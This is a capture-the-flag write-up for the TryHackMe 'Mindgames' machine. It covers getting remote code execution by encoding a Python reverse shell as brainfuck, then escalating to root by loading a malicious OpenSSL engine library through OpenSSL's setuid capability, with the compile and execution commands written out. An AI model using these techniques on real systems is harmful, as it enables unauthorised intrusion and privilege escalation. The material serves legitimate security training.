Machine: Mindgames
Link: https://tryhackme.com/room/mindgames  

Connect to Tryhackme vpn and spawn the machine  

export the ip ("export IP='target IP'")  

Start with a nmap/rustscan scan ("nmap -sC -sV $IP"/"rustscan -a $IP")

we didn't find anything from ssh so lets access the http port(80)  

![website](https://github.com/Debang5hu/ctf-writeups/assets/114200360/12cbe45e-6c13-4710-97cf-642639fc41e5)


from the website we find 2 code of 'brainfuck' and one section where we can execute our code.  

after decrypting the code we found the code to be of python  

![python_code](https://github.com/Debang5hu/ctf-writeups/assets/114200360/ea5bd0c1-6db7-422e-8d54-1d331e32cd1c)


so I tried to execute python code in the "Try before you buy" section but it didn't executed  

then I converted the python reverse shell payload into brainfuck and then executed.  

![python_to_brainfuck](https://github.com/Debang5hu/ctf-writeups/assets/114200360/6bddebc4-20fb-4eb3-ba7d-55b4dab2caba)  



It got RCE vulnerability and we got the shell  


```
python3 -c "import pty;pty.spawn('/bin/bash')"

```  

to get the user.txt  

```
cat /home/mindgames/user.txt 

```
![user_txt](https://github.com/Debang5hu/ctf-writeups/assets/114200360/bb11d5ed-fc9b-4b7a-902e-3bdbaf7968b1)




To get the Root Shell  
-------------------------  


letâ€™s try "sudo -l" to see if mindgames can run sudo:  

but we don't have mindgames password  

Now let's check for capabilities

```
getcap -r / 2>/dev/null
```  

Openssl has the setuid cap.  

write an C program to exploit it  

refer to <a href="https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/"></a>  


![exploit](https://github.com/Debang5hu/ctf-writeups/assets/114200360/9acc3e67-57fc-410b-9e82-1c5a1946108d)


Now compile this c program  

```
gcc -fPIC -o filename.o -c filename.c && gcc -shared -o filename.so -lcrypto filename.o

```  

Now transfer the ".so" file to the target machine using python's http server  

then use Openssl and execute the  new lib  

```
openssl req -engine shellroot.so

```  

and boom we are ROOT  

to get the final flag  

```
cat /root/root.txt

```  

Thankyou
